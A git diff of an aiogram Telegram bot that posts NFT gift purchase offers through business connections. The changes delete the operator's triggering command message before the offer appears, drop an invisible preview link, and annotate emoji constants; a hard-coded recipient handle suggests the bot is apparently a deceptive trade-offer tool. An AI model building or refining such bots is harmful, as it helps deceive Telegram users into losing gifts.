@@ -3,8 +3,6 @@ import re
 import random
 import string
 import logging
-import json
-import aiohttp
 from aiogram import Bot, Dispatcher, F
 from aiogram.client.default import DefaultBotProperties
 from aiogram.enums import ParseMode
@@ -28,15 +26,16 @@ GIFT_RE = re.compile(r"t\.me/nft/([A-Za-z]+?)-(\d+)")
 RECIPIENT = "@tradiqx"
 LANG_TAGS = {"ru", "ukr", "eng", "cn", "en", "uk", "zh"}
 
-E_GEM   = "5318901904686754959"
-E_WARN  = "6030563507299160824"
-E_OK    = "5774022692642492953"
-E_NO    = "5774077015388852135"
-E_TIMER = "6037268453759389862"
-E_GIFT  = "5773677501825945508"
-E_STAR  = "6028338546736107668"
-E_CHECK = "5774022692642492953"
-E_LOCK  = "5774077015388852135"
+# ---- Premium emoji IDs (все 7) ----
+E_GEM   = "5318901904686754959"   # 💎 алмаз / GRAM
+E_WARN  = "6030563507299160824"   # ⚠ восклицание
+E_OK    = "5774022692642492953"   # ✅ галочка (кнопка «Принять»)
+E_NO    = "5774077015388852135"   # ❌ крестик (кнопка «Отклонить»)
+E_TIMER = "6037268453759389862"   # ⏱ часы
+E_GIFT  = "5773677501825945508"   # 🎁 подарок
+E_STAR  = "6028338546736107668"   # ⭐ звезда
+E_CHECK = "5774022692642492953"   # ✅ галочка (финал)
+E_LOCK  = "5774077015388852135"   # 🔒 замок (используем крестик как «защита»)
 
 
 def em(eid: str, fallback: str) -> str:
@@ -242,12 +241,7 @@ def gift_link_bold(gift_name, gift_num, lang):
 
 
 def build_offer_text(amount, currency, gift_name, gift_num, lang):
-    slug = gift_name.replace(" ", "")
-    preview_url = f"https://t.me/nft/{slug}-{gift_num}"
-    # невидимая ссылка в начале — Telegram берёт её для превью
-    hidden = f'<a href="{preview_url}"> </a>'
     return (
-        f'{hidden}'
         f'{em(E_GIFT, "🎁")} {T(lang, "offer_1")}\n'
         f'{amount_line(amount, currency, lang)} {T(lang, "offer_for")} '
         f'{gift_link_bold(gift_name, gift_num, lang)}.\n\n'
@@ -372,8 +366,16 @@ async def handle_business_message(message: Message):
     if not gift:
         return
     gift_name, gift_num = gift
+    preview_url = _gift_preview_url(gift_name, gift_num)
 
-    # сначала шлём — если упал, команду не удаляем
+    try:
+        await bot.delete_business_messages(
+            business_connection_id=bcid,
+            message_ids=[message.message_id],
+        )
+    except Exception as e:
+        logging.warning(f"delete error: {e}")
+
     try:
         await bot.send_message(
             chat_id=message.chat.id,
@@ -381,29 +383,13 @@ async def handle_business_message(message: Message):
             reply_markup=make_offer_keyboard(amount, currency, gift_name, gift_num, lang),
             business_connection_id=bcid,
             link_preview_options=LinkPreviewOptions(
+                url=preview_url,
                 prefer_large_media=True,
-                show_above_text=True,
             ),
         )
     except Exception as e:
         logging.error(f"send error: {e}")
         return
-
-    # send прошёл — удаляем команду
-    try:
-        async with aiohttp.ClientSession() as s:
-            async with s.post(
-                f"https://api.telegram.org/bot{BOT_TOKEN}/deleteBusinessMessages",
-                data={
-                    "business_connection_id": bcid,
-                    "message_ids": json.dumps([message.message_id]),
-                },
-            ) as r:
-                res = await r.json()
-                if not res.get("ok"):
-                    logging.warning(f"deleteBusinessMessages failed: {res}")
-    except Exception as e:
-        logging.warning(f"delete error: {e}")
 
 
 @dp.message(CommandStart())
